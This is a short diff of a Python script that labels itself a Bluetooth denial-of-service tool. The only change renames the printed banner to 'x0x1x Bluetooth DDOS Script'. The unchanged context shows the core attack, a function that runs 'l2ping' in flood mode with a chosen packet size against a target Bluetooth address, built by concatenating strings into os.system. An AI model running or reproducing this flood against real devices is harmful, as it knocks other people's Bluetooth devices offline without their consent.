@@ -6,7 +6,7 @@ def DOS(target_addr, packages_size):
     os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
 
 def printLogo():
-    print('                            Bluetooth DOS Script                            ')
+    print('                      x0x1x Bluetooth DDOS Script                            ')
 def main():
     printLogo()
     time.sleep(0.1)
